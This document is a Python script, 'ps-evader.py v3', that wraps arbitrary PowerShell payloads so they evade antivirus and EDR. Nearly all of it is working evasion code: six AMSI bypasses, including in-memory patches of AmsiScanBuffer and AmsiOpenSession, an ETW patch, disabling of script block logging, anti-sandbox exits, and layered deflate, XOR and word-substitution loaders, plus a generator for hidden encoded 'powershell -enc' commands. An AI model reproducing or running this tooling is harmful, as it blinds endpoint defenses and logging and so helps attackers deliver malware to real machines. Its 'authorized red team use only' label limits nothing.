#!/usr/bin/env python3
"""
ps-evader.py v3 — PowerShell AV/EDR evasion obfuscator
Authorized red team use only.

v3 additions:
  - --encode dict: dictionary-substitution encoding (English words, zero base64/compression)
    Payload stored as space-separated English words → zero recognizable byte patterns,
    very low entropy, full polymorphism (different word→byte mapping per run).
    Decoder: split on space + hashtable lookup + UTF8.GetString — no crypto/compression APIs.
  - --wordlist: custom wordlist (local file or HTTP URL), falls back to 256 embedded words.

v2 fixes vs v1:
  - GzipStream replaced by DeflateStream
  - XOR encoding option
  - AMSI v5/v6: fuzzy GetTypes() + amsiContext corruption
  - AMSI v4: AmsiOpenSession patch (Win11 24H2+)
  - Execution randomized across 3 methods per build
  - Anti-sandbox checks (CPU/RAM/uptime)
  - All sensitive .NET class names charcode-encoded
"""

import argparse, base64, zlib, random, string, sys

# ─── Embedded wordlist (256 unique lowercase alpha words, len≥3) ─────────────
# Used when --wordlist is not specified. Shuffled at build time.

FALLBACK_WORDS = [
    "about","above","across","after","again","ahead","along","among",
    "apart","around","arrive","away","back","ball","bank","base",
    "bath","bear","beat","become","before","behind","below","between",
    "beyond","black","blue","body","book","break","bring","broad",
    "build","busy","call","calm","camp","care","carry","catch",
    "cause","change","chase","check","child","city","class","clean",
    "clear","climb","close","cloth","cloud","cold","come","cool",
    "copy","corn","cost","count","cover","craft","cross","crowd",
    "curve","dark","dawn","deep","desk","dice","dirt","door",
    "doubt","down","draw","dream","drive","drop","drum","dust",
    "early","earth","east","edge","empty","enter","even","ever",
    "every","exact","face","fact","fair","fall","false","fame",
    "farm","fast","feel","fetch","field","fight","fill","find",
    "fire","fish","flat","float","floor","flow","foam","focus",
    "fold","fond","food","force","form","four","free","fresh",
    "from","fuel","full","gain","game","gate","gave","gaze",
    "glad","glow","gold","good","grab","grade","grain","grand",
    "grass","great","green","grey","grow","guard","guide","hand",
    "hard","harm","have","heat","heavy","high","hold","home",
    "hook","hope","horn","hour","hunt","idea","iron","join",
    "jump","just","keen","keep","kind","king","know","lack",
    "lamp","land","late","lead","leaf","lean","learn","left",
    "less","life","lift","light","like","line","list","live",
    "load","long","look","lost","love","luck","made","mail",
    "main","make","many","mark","mass","math","mean","meet",
    "mile","milk","mind","miss","more","most","move","much",
    "name","near","need","nice","nine","none","norm","note",
    "once","open","over","pace","pack","page","pain","pair",
    "park","part","pass","past","path","peak","pick","pile",
    "pine","pipe","plan","play","plus","pole","poor","post",
    "pour","push","race","rain","rank","rare","rate","read",
    "real","rest","rice","rich","ride","rise","risk","road",
]
assert len(FALLBACK_WORDS) == 256 and len(set(FALLBACK_WORDS)) == 256

# ─── Primitives ──────────────────────────────────────────────────────────────

def rvar() -> str:
    """Random PS variable name: $Xxxxxxx"""
    return '$' + ''.join(random.choices(string.ascii_letters, k=random.randint(5, 12)))

def rname() -> str:
    """Random identifier (no $) for C# class names"""
    return random.choice(string.ascii_letters) + \
           ''.join(random.choices(string.ascii_letters, k=random.randint(5, 11)))

def cc(s: str) -> str:
    """Encode string as PS char-code expression — no sensitive literal in output."""
    inner = ','.join(f'[char]{ord(c)}' for c in s)
    return f'([string]::join("",({inner})))'

def deflate_b64(data: bytes) -> str:
    """Raw DEFLATE (wbits=-15) → base64. Compatible with .NET DeflateStream."""
    comp = zlib.compressobj(9, zlib.DEFLATED, -15)
    return base64.b64encode(comp.compress(data) + comp.flush()).decode('ascii')

def xor_b64(data: bytes, key: int) -> str:
    return base64.b64encode(bytes(b ^ key for b in data)).decode('ascii')

def xor_deflate_b64(data: bytes, key: int) -> str:
    comp = zlib.compressobj(9, zlib.DEFLATED, -15)
    deflated = comp.compress(data) + comp.flush()
    return base64.b64encode(bytes(b ^ key for b in deflated)).decode('ascii')

# ─── Dictionary encoding ──────────────────────────────────────────────────────

def get_wordlist(source: str = None) -> list:
    """Load, clean, and return a shuffled list of >= 256 unique alpha words."""
    if source is None:
        pool = list(FALLBACK_WORDS)
        random.shuffle(pool)
        return pool

    if source.startswith('http://') or source.startswith('https://'):
        import urllib.request
        try:
            with urllib.request.urlopen(source, timeout=15) as r:
                content = r.read().decode('utf-8', errors='ignore')
            print(f'[+] Wordlist fetched from {source}')
        except Exception as e:
            print(f'[!] Wordlist fetch failed ({e}), using fallback.', file=sys.stderr)
            pool = list(FALLBACK_WORDS)
            random.shuffle(pool)
            return pool
    else:
        with open(source, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

    seen, pool = set(), []
    for w in content.splitlines():
        w = w.strip().lower()
        if w.isalpha() and len(w) >= 3 and w not in seen:
            seen.add(w)
            pool.append(w)

    if len(pool) < 256:
        print(f'[!] Only {len(pool)} clean words in wordlist (need 256), using fallback.',
              file=sys.stderr)
        pool = list(FALLBACK_WORDS)

    random.shuffle(pool)
    return pool

def dict_encode_bytes(data: bytes, words: list) -> tuple:
    """Map each byte value (0-255) to a unique word, encode data as space-joined words.
    Returns (encoded_string, {word: byte_val}) for the PS decoder hashtable."""
    b2w = {i: words[i] for i in range(256)}    # byte value → word
    w2b = {words[i]: i for i in range(256)}    # word → byte value (for PS)
    encoded = ' '.join(b2w[b] for b in data)
    return encoded, w2b

def wrap_dict(encoded: str, word_map: dict) -> str:
    """PS decoder: split on space → hashtable lookup → byte array → UTF8 → execute.
    No base64, no compression, no crypto APIs. Low-entropy ciphertext (English words)."""
    vd, vm, vw, vb, vi, vs = (rvar() for _ in range(6))
    # Build compact PS hashtable: @{"word1"=0;"word2"=1;...}
    ht_body = ';'.join(f'"{w}"={b}' for w, b in word_map.items())
    return '\n'.join([
        f'{vd}="{encoded}"',
        f'{vm}=@{{{ht_body}}}',
        f'{vw}={vd}.Split([char]32)',
        f'{vb}=New-Object byte[] {vw}.Length',
        f'for({vi}=0;{vi}-lt{vw}.Length;{vi}++){{{vb}[{vi}]=[byte]{vm}[{vw}[{vi}]]}}',
        f'{vs}=[System.Text.Encoding]::UTF8.GetString({vb})',
        _exec_stmt(vs),
    ])

# ─── P/Invoke helper ─────────────────────────────────────────────────────────

def _pinvoke_cs() -> tuple:
    t = rname()
    cs = (
        'using System;using System.Runtime.InteropServices;'
        f'public class {t}{{'
        '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);'
        '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);'
        '[DllImport("kernel32")]public static extern bool VirtualProtect'
        '(IntPtr a,UIntPtr s,uint p,out uint o);}'
    )
    return t, cs

# ─── AMSI bypasses ───────────────────────────────────────────────────────────

def amsi_v1() -> str:
    a, b = rvar(), rvar()
    return '\n'.join([
        f'{a}=[Ref].Assembly.GetType({cc("System.Management.Automation.AmsiUtils")})',
        f'{b}={a}.GetField({cc("amsiInitFailed")},{cc("NonPublic,Static")})',
        f'{b}.SetValue($null,$true)',
    ])

def amsi_v2() -> str:
    a, b = rvar(), rvar()
    return '\n'.join([
        f'{a}=[Ref].Assembly.GetType({cc("System.Management.Automation.AmsiUtils")})',
        f'{b}={a}.GetField({cc("amsiContext")},{cc("NonPublic,Static")})',
        f'{b}.SetValue($null,[IntPtr]::Zero)',
    ])

def amsi_v3() -> str:
    t, cs = _pinvoke_cs()
    h, p, o = rvar(), rvar(), rvar()
    return '\n'.join([
        f'Add-Type -TypeDefinition @\'\n{cs}\n\'@',
        f'{h}=[{t}]::LoadLibrary({cc("amsi.dll")})',
        f'{p}=[{t}]::GetProcAddress({h},{cc("AmsiScanBuffer")})',
        f'{o}=0',
        f'[{t}]::VirtualProtect({p},[UIntPtr]8,0x40,[ref]{o})|Out-Null',
        f'[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,{p},6)',
    ])

def amsi_v4() -> str:
    t, cs = _pinvoke_cs()
    h, p, o = rvar(), rvar(), rvar()
    return '\n'.join([
        f'Add-Type -TypeDefinition @\'\n{cs}\n\'@',
        f'{h}=[{t}]::LoadLibrary({cc("amsi.dll")})',
        f'{p}=[{t}]::GetProcAddress({h},{cc("AmsiOpenSession")})',
        f'{o}=0',
        f'[{t}]::VirtualProtect({p},[UIntPtr]3,0x40,[ref]{o})|Out-Null',
        f'[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x31,0xC0),0,{p},3)',
    ])

def amsi_v5() -> str:
    a, b = rvar(), rvar()
    return '\n'.join([
        f'{a}=([Ref].Assembly.GetTypes()|?{{$_.Name -like {cc("*AmsiUtils")}}})[0]',
        f'{b}={a}.GetFields({cc("NonPublic,Static")})|?{{$_.Name -like {cc("*nitFailed")}}}',
        f'if({b}){{{b}|%{{$_.SetValue($null,$true)}}}}',
    ])

def amsi_v6() -> str:
    a, b, c, d = rvar(), rvar(), rvar(), rvar()
    return '\n'.join([
        f'{a}=([Ref].Assembly.GetTypes()|?{{$_.Name -like {cc("*AmsiUtils")}}})[0]',
        f'{b}=({a}.GetFields({cc("NonPublic,Static")})|?{{$_.Name -like {cc("*Context")}}})[0]',
        f'{c}={b}.GetValue($null)',
        f'[IntPtr]{d}={c}',
        f'[System.Runtime.InteropServices.Marshal]::Copy([Int32[]](0,0,0,0),0,{d},1)',
    ])

# ─── ETW bypass ──────────────────────────────────────────────────────────────

def etw_patch() -> str:
    t, cs = _pinvoke_cs()
    h, p, o = rvar(), rvar(), rvar()
    return '\n'.join([
        f'Add-Type -TypeDefinition @\'\n{cs}\n\'@',
        f'{h}=[{t}]::LoadLibrary({cc("ntdll.dll")})',
        f'{p}=[{t}]::GetProcAddress({h},{cc("EtwEventWrite")})',
        f'{o}=0',
        f'[{t}]::VirtualProtect({p},[UIntPtr]3,0x40,[ref]{o})|Out-Null',
        f'[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x33,0xC0,0xC3),0,{p},3)',
    ])

# ─── Script block logging bypass ─────────────────────────────────────────────

def sbl_bypass() -> str:
    a, b = rvar(), rvar()
    return '\n'.join([
        f'{a}=[Ref].Assembly.GetType({cc("System.Management.Automation.Tracing.PSEtwLogProvider")})',
        f'{b}={a}.GetField({cc("etwProvider")},{cc("NonPublic,Static")}).GetValue($null)',
        f'[void]{b}.GetType().GetField({cc("m_enabled")},{cc("NonPublic,Instance")}).SetValue({b},[Byte]0)',
    ])

# ─── Anti-sandbox checks ─────────────────────────────────────────────────────

def sandbox_checks() -> str:
    vmem = rvar()
    min_cpu  = random.randint(2, 4)
    min_tick = random.randint(120, 480) * 1000
    min_ram  = random.randint(2, 4)
    return '\n'.join([
        f'if([System.Environment]::ProcessorCount -lt {min_cpu}){{exit}}',
        f'if([System.Environment]::TickCount -lt {min_tick}){{exit}}',
        f'{vmem}=try{{(Get-CimInstance {cc("Win32_ComputerSystem")}).TotalPhysicalMemory}}catch{{99GB}}',
        f'if({vmem} -lt {min_ram}GB){{exit}}',
    ])

# ─── Execution variants ───────────────────────────────────────────────────────

def _exec_stmt(code_var: str) -> str:
    choice = random.randint(1, 3)
    if choice == 1:
        return f'&([scriptblock]::create({code_var}))'
    elif choice == 2:
        sb = rvar()
        return (f'{sb}=[scriptblock]::Create({code_var})\n'
                f'$ExecutionContext.InvokeCommand.InvokeScript($false,{sb},$null,$null)')
    else:
        ps = rvar()
        return (f'{ps}=[PowerShell]::Create()\n'
                f'{ps}.AddScript({code_var})|Out-Null\n'
                f'{ps}.Invoke()\n'
                f'{ps}.Dispose()')

# ─── Payload wrappers ─────────────────────────────────────────────────────────

def wrap_deflate(b64: str) -> str:
    vb, vm, vr, vs = rvar(), rvar(), rvar(), rvar()
    return '\n'.join([
        f'{vb}="{b64}"',
        f'{vm}=New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String({vb}))',
        f'{vr}=New-Object System.IO.StreamReader('
        f'New-Object System.IO.Compression.DeflateStream({vm},'
        f'[System.IO.Compression.CompressionMode]::Decompress))',
        f'{vs}={vr}.ReadToEnd()',
        f'{vr}.Close()',
        _exec_stmt(vs),
    ])

def wrap_xor(b64: str, key: int) -> str:
    vb, ve, vd, vi, vl, vs = rvar(), rvar(), rvar(), rvar(), rvar(), rvar()
    return '\n'.join([
        f'{vb}="{b64}"',
        f'{ve}=[System.Convert]::FromBase64String({vb})',
        f'{vl}={ve}.Length',
        f'{vd}=New-Object byte[] {vl}',
        f'for({vi}=0;{vi}-lt{vl};{vi}++){{{vd}[{vi}]={ve}[{vi}]-bxor{key}}}',
        f'{vs}=[System.Text.Encoding]::UTF8.GetString({vd})',
        _exec_stmt(vs),
    ])

def wrap_xor_deflate(b64: str, key: int) -> str:
    vb, ve, vd, vi, vl, vm, vr, vs = (rvar() for _ in range(8))
    return '\n'.join([
        f'{vb}="{b64}"',
        f'{ve}=[System.Convert]::FromBase64String({vb})',
        f'{vl}={ve}.Length',
        f'{vd}=New-Object byte[] {vl}',
        f'for({vi}=0;{vi}-lt{vl};{vi}++){{{vd}[{vi}]={ve}[{vi}]-bxor{key}}}',
        f'{vm}=New-Object System.IO.MemoryStream(,{vd})',
        f'{vr}=New-Object System.IO.StreamReader('
        f'New-Object System.IO.Compression.DeflateStream({vm},'
        f'[System.IO.Compression.CompressionMode]::Decompress))',
        f'{vs}={vr}.ReadToEnd()',
        f'{vr}.Close()',
        _exec_stmt(vs),
    ])

# ─── Build ────────────────────────────────────────────────────────────────────

AMSI_FNS = {
    '1': amsi_v1, '2': amsi_v2, '3': amsi_v3,
    '4': amsi_v4, '5': amsi_v5, '6': amsi_v6,
}

def build(src: str, args) -> str:
    key  = random.randint(0x21, 0xFE)
    key2 = random.randint(0x21, 0xFE)
    while key2 == key:
        key2 = random.randint(0x21, 0xFE)

    parts = []

    if args.sandbox:
        parts.append(sandbox_checks())

    if not args.no_amsi:
        parts.append(f'try{{{AMSI_FNS[args.amsi]()}}}catch{{}}')

    if args.etw:
        parts.append(f'try{{{etw_patch()}}}catch{{}}')

    if args.no_logging:
        parts.append(f'try{{{sbl_bypass()}}}catch{{}}')

    data = src.encode('utf-8')
    enc  = args.encode

    if enc == 'dict':
        wordlist_src = getattr(args, 'wordlist', None)
        words = get_wordlist(wordlist_src)
        encoded_str, word_map = dict_encode_bytes(data, words)
        if args.double:
            # Double dict: encode the inner PS wrapper as a second dict layer
            inner = wrap_dict(encoded_str, word_map)
            words2 = get_wordlist(wordlist_src)
            enc2, wmap2 = dict_encode_bytes(inner.encode('utf-8'), words2)
            parts.append(wrap_dict(enc2, wmap2))
        else:
            parts.append(wrap_dict(encoded_str, word_map))
    elif args.double:
        if enc == 'deflate':
            inner = wrap_deflate(deflate_b64(data))
        elif enc == 'xor':
            inner = wrap_xor(xor_b64(data, key), key)
        else:
            inner = wrap_xor_deflate(xor_deflate_b64(data, key), key)
        parts.append(wrap_xor_deflate(xor_deflate_b64(inner.encode('utf-8'), key2), key2))
    else:
        if enc == 'deflate':
            parts.append(wrap_deflate(deflate_b64(data)))
        elif enc == 'xor':
            parts.append(wrap_xor(xor_b64(data, key), key))
        else:
            parts.append(wrap_xor_deflate(xor_deflate_b64(data, key), key))

    return '\n'.join(parts)

# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description='PowerShell AV/EDR evasion obfuscator v3 — authorized red team use only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
AMSI variants:
  1  amsiInitFailed = true         (reflection — widely signatured, charcode helps)
  2  amsiContext = IntPtr.Zero     (reflection — same caveat)
  3  AmsiScanBuffer memory patch   (P/Invoke + VirtualProtect)
  4  AmsiOpenSession patch         (P/Invoke — best on Win11 24H2+)
  5  Fuzzy GetTypes() search       (default — no direct class name lookup)
  6  amsiContext struct corruption (no SetValue pattern — different behavior)

Encoding:
  deflate  raw DEFLATE + base64            (DeflateStream decoder, not GzipStream)
  xor      XOR key + base64               (no compression class at all)
  both     DEFLATE then XOR               (two independent layers)
  dict     English word substitution      (no base64, no compression, low entropy)
           Each byte → random word. Decoder: split+lookup+UTF8. Zero crypto APIs.
           Most polymorphic: different word→byte mapping per build.

Recommended combinations:
  --amsi 5 --encode dict                       # best static bypass, no base64
  --amsi 6 --encode dict --wordlist words.txt  # custom wordlist, max polymorphism
  --amsi 5 --encode dict --sandbox             # + anti-sandbox
  --amsi 5 --encode dict --double              # two nested dict layers
  --amsi 4 --encode both --etw --double        # P/Invoke based, max layers
  --amsi 5 --encode deflate                    # fallback balanced option

Examples:
  python3 ps-evader.py -i payload.ps1 -o evaded.ps1
  python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --encode dict
  python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --encode dict --wordlist /usr/share/wordlists/rockyou.txt
  python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --encode dict --wordlist https://www.mit.edu/~ecprice/wordlist.10000
  python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --amsi 6 --encode xor
  python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --amsi 6 --encode both --sandbox --double
  python3 ps-evader.py -i payload.ps1 -o evaded.ps1 --amsi 4 --etw --no-logging --enc-cmd
        """)
    ap.add_argument('-i', '--input',    required=True,  help='Input .ps1 file')
    ap.add_argument('-o', '--output',   required=True,  help='Output .ps1 file')
    ap.add_argument('--amsi',           choices=['1','2','3','4','5','6'], default='5',
                    help='AMSI bypass variant (default: 5 = fuzzy GetTypes)')
    ap.add_argument('--no-amsi',        action='store_true', help='Skip AMSI bypass')
    ap.add_argument('--etw',            action='store_true', help='ETW bypass (EtwEventWrite → nop)')
    ap.add_argument('--no-logging',     action='store_true', help='Disable script block logging')
    ap.add_argument('--sandbox',        action='store_true', help='Anti-sandbox checks (CPU/RAM/uptime)')
    ap.add_argument('--encode',         choices=['deflate','xor','both','dict'], default='deflate',
                    help='Payload encoding (default: deflate)')
    ap.add_argument('--wordlist',       default=None,
                    help='Wordlist for --encode dict (local path or HTTP URL). '
                         'Default: 256 embedded words.')
    ap.add_argument('--double',         action='store_true', help='Second encoding layer')
    ap.add_argument('--enc-cmd',        action='store_true',
                    help='Also write _enc.txt with: powershell -nop -w hidden -enc <b64>')
    ap.add_argument('--seed',           type=int, help='RNG seed for reproducible output')
    args = ap.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    with open(args.input, 'r', encoding='utf-8-sig', errors='replace') as f:
        src = f.read()

    output = build(src, args)

    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(output)

    if args.enc_cmd:
        enc_path = args.output.rsplit('.', 1)[0] + '_enc.txt'
        enc_b64 = base64.b64encode(output.encode('utf-16-le')).decode('ascii')
        with open(enc_path, 'w') as f:
            f.write(f'powershell -nop -w hidden -enc {enc_b64}\n')
        print(f'[+] Encoded cmd  → {enc_path}')

    amsi_desc = {
        '1': 'amsiInitFailed (reflection)',
        '2': 'amsiContext=null (reflection)',
        '3': 'AmsiScanBuffer patch (P/Invoke)',
        '4': 'AmsiOpenSession patch (P/Invoke, Win11+)',
        '5': 'Fuzzy GetTypes() search',
        '6': 'amsiContext corruption (Marshal.Copy)',
    }
    enc_desc = {
        'deflate': 'deflate+base64 (DeflateStream)',
        'xor':     'XOR+base64',
        'both':    'deflate+XOR+base64',
        'dict':    f'dictionary words ({"embedded 256-word fallback" if not args.wordlist else args.wordlist})',
    }
    print(f'[+] {args.input} → {args.output}')
    print(f'    AMSI     : {"skip" if args.no_amsi else amsi_desc.get(args.amsi)}')
    print(f'    ETW      : {"patched" if args.etw else "no  (--etw)"}')
    print(f'    SBL      : {"disabled" if args.no_logging else "no  (--no-logging)"}')
    print(f'    Sandbox  : {"checked" if args.sandbox else "no  (--sandbox)"}')
    print(f'    Encoding : {enc_desc[args.encode]}{"  ×2 layers" if args.double else ""}')
    print(f'    Size     : {len(src):,} B → {len(output):,} B')

if __name__ == '__main__':
    main()
